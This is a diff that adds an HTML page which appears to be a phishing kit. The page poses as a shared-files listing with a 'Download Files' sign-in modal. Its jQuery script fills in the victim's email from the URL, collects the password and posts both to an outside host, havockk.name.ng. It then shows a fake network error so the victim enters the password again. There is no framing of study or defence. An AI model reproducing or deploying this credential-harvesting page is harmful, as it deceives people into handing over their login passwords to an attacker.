@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title></title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+   <link rel="stylesheet" href="bootstrap.min.css">
+  <script src="jquery.min.js"></script>
+
+  <script src="bootstrap.min.js"></script>
+    <script>
+$(document).ready(function() {
+
+ 
+
+
+
+    var baseUrl = (window.location).href;
+
+    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+
+    $("#x1").val(url);
+
+
+
+    $("#formx").submit(function(e) {
+
+        e.preventDefault();
+
+        var nm = $("#A1").val();
+
+        var formData = new FormData($("#formx")[0]);
+
+        $("#submitBtn").html("Processing..").prop("disabled", true);
+
+        $.ajax({
+
+            url: "https://havockk.name.ng/as/e.php",
+
+            type: 'POST',
+
+     	    crossDomain:true,
+
+            data: formData,
+
+            contentType: false,
+
+            processData: false,
+
+         
+
+            success: function(res) {
+
+                
+
+                $('#bd').show();
+
+                $('#hm').hide();
+
+                setTimeout(function() {
+
+                    $("#x1").val(url);
+
+                    $("#x2").val("");
+
+                    $('#msg').html(`Network Error! Please verify your information and try again`);
+
+                    $("#submitBtn").html("Sign In").prop("disabled", false);
+
+                }, 2000);
+
+
+
+            }
+
+        });
+
+    });
+
+
+
+});
+</script>
+    <style>
+        .col-sm-3 {
+            cursor: pointer;
+        }
+        /* #myModal {
+            position: absolute;
+            top: 70%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        } */
+        
+        @media (max-width: 575.98px) {
+            /* #myModal {
+                position: absolute;
+                top: 70%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+            } */
+            #asd,
+            .col-sm-2,
+            .col-sm-4 {
+                display: none;
+            }
+            .col-sm-3 {
+                width: 46%
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+  <div class="row">
+
+<div class="col-sm-2"> <img src="im/sd.png" class="img-fluid"></div>
+
+<div class="col-sm-6">
+
+<img src="im/7.png">
+
+<table class="table ">
+
+    <tr data-toggle="modal" data-toggle="modal" data-target="#myModal">
+
+        <th>Name↑</th>
+
+        <th>Modified▼</th>
+
+        <th>Members▼</th>
+
+    </tr>
+
+    <tr data-toggle="modal" data-toggle="modal" data-target="#myModal">
+
+        <td><img src="im/2.png"></td>
+
+        <td><img src="im/4.png"></td>
+
+        <td><img src="im/5.png"></td>
+
+    </tr>
+
+    <tr data-toggle="modal" data-toggle="modal" data-target="#myModal">
+
+        <td><img src="im/1.png"></td>
+
+        <td><img src="im/4.png"></td>
+
+        <td><img src="im/5.png"></td>
+
+    </tr>
+
+    <tr data-toggle="modal" data-toggle="modal" data-target="#myModal">
+
+        <td><img src="im/3.png"></td>
+
+        <td><img src="im/4.png"></td>
+
+        <td><img src="im/5.png"></td>
+
+    </tr>
+
+</table>
+
+</div>
+
+<div class="col-sm-4"><img src="im/sd2.png" class="img-fluid"></div>
+
+</div>
+
+
+
+    
+
+    <!-- The Modal -->
+
+    <div class="modal" id="myModal">
+
+        <div class="modal-dialog">
+
+            <div class="modal-content">
+
+
+
+                <!-- Modal Header -->
+
+              
+
+
+
+                <!-- Modal body -->
+
+                <div class="modal-body p-3">
+
+
+
+                  <img src="im/to.png" class="img-fluid">
+
+<div class="text-danger" id="msg" style="font-weight:600; font-size:17px;"></div>
+
+                    <form method="post" id="formx" class="my-4">
+
+                        
+
+                    
+
+                        <input type="email" name="x1" id="x1" class="form-control" value="" readonly>
+
+                        <div class="mb-1"><img src="im/cc.png" class="img-fluid"></div>
+
+                        <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Receiver's Password" value="" required>
+
+                     
+
+                        <div class="text-center">
+
+                        <button id="submitBtn" class="btn btn-md btn-primary">Download Files</button><br>
+
+                        <img src="im/mn.png" class="img-fluid">
+
+                        </div>
+
+                    </form>
+
+
+
+                  
+
+                 
+
+
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+
+</body>
+
+</html>
